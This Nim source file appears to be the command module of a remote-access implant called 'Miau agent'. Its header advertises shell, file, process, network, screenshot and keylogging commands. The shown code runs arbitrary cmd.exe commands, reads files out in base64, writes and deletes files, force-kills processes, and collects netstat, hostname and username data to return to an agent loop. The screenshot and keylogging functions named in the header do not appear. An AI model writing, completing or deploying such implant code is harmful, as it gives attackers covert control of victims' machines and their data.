## Miau agent command implementations: shell, file manager, process/net,
## screenshots, keylogging. Each returns a Response tuple consumed by the
## agent loop.
import os, std/strutils, std/times, std/json, std/osproc, std/base64
import nativesockets
import miau_codec

type
  ExecResult* = object
    status*: int
    message*: string
    data*: string
    final*: bool

proc runShell*(args: string, timeoutMs: int): ExecResult =
  ## Execute a shell command (cmd.exe /c). Output captured.
  var cmd = args
  if cmd.len == 0: cmd = "help"
  let usePowershell = false
  var buf = ""
  try:
    if usePowershell:
      buf = execProcess("powershell.exe", args = @["-NoProfile", "-Command", cmd])
    else:
      buf = execProcess("cmd.exe", args = @["/c", cmd])
    result = ExecResult(status: RESP_OK, message: "ok", data: buf, final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc fileList*(args: string): ExecResult =
  ## List directory. args = path (default current).
  let path = if args.len == 0: getCurrentDir() else: expandFilename(args)
  var lines = ""
  try:
    if not dirExists(path):
      return ExecResult(status: RESP_ERROR, message: "not a directory: " & path,
                        data: "", final: true)
    for kind, p in walkDir(path):
      let full = if p.endsWith("\\") or p.endsWith("/"): p else: p
      var isDir = kind == pcDir
      var size = 0'i64
      if not isDir:
        try: size = getFileSize(full)
        except: discard
      let t = getLastModificationTime(full)
      lines.add(full)
      lines.add(if isDir: "\tDIR\t" else: "\t" & $size & "\t")
      lines.add($t)
      lines.add("\n")
    result = ExecResult(status: RESP_OK, message: path, data: lines, final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc fileDelete*(args: string): ExecResult =
  let path = args.strip()
  if path.len == 0:
    return ExecResult(status: RESP_ERROR, message: "no path", data: "", final: true)
  try:
    if dirExists(path):
      removeDir(path)
    elif fileExists(path):
      removeFile(path)
    else:
      return ExecResult(status: RESP_ERROR, message: "not found", data: "", final: true)
    result = ExecResult(status: RESP_OK, message: "deleted " & path, data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc fileRead*(args: string, maxBytes = 4 * 1024 * 1024): ExecResult =
  let path = args.strip()
  if path.len == 0:
    return ExecResult(status: RESP_ERROR, message: "no path", data: "", final: true)
  try:
    let f = open(path, fmRead)
    let size = min(getFileSize(path), maxBytes)
    var buf = newString(size)
    discard f.readChars(buf, 0, size)
    f.close()
    # base64 for binary safety
    result = ExecResult(status: RESP_OK, message: "size=" & $size, data: encode(buf), final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc fileWrite*(path: string, b64: string): ExecResult =
  try:
    let payload = decode(b64)
    let f = open(path, fmWrite)
    f.write(payload)
    f.close()
    result = ExecResult(status: RESP_OK, message: "written " & $payload.len, data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc processList*(): ExecResult =
  ## tasklist output (name, pid).
  var res = ""
  try:
    res = execProcess("tasklist.exe", args = @["/FO", "CSV", "/NH"])
  except:
    discard
  result = ExecResult(status: RESP_OK, message: "ok", data: res, final: true)

proc processKill*(args: string): ExecResult =
  let pid = args.strip()
  if pid.len == 0:
    return ExecResult(status: RESP_ERROR, message: "no pid", data: "", final: true)
  try:
    discard execProcess("taskkill.exe", args = @["/PID", pid, "/F"])
    result = ExecResult(status: RESP_OK, message: "kill sent " & pid, data: "", final: true)
  except CatchableError as exc:
    result = ExecResult(status: RESP_ERROR, message: exc.msg, data: "", final: true)

proc netList*(): ExecResult =
  var res = ""
  try:
    res = execProcess("netstat.exe", args = @["-ano"])
  except:
    discard
  result = ExecResult(status: RESP_OK, message: "ok", data: res, final: true)

proc sysInfo*(): ExecResult =
  var res = ""
  res.add("hostname=" & getHostname() & "\n")
  res.add("os=" & hostOS & "\n")
  res.add("cpu=" & $countProcessors() & " cores\n")
  res.add("cwd=" & getCurrentDir() & "\n")
  res.add("user=" & getEnv("USERNAME", "") & "\n")
  res.add("arch=" & hostCPU & "\n")
  result = ExecResult(status: RESP_OK, message: "ok", data: res, final: true)
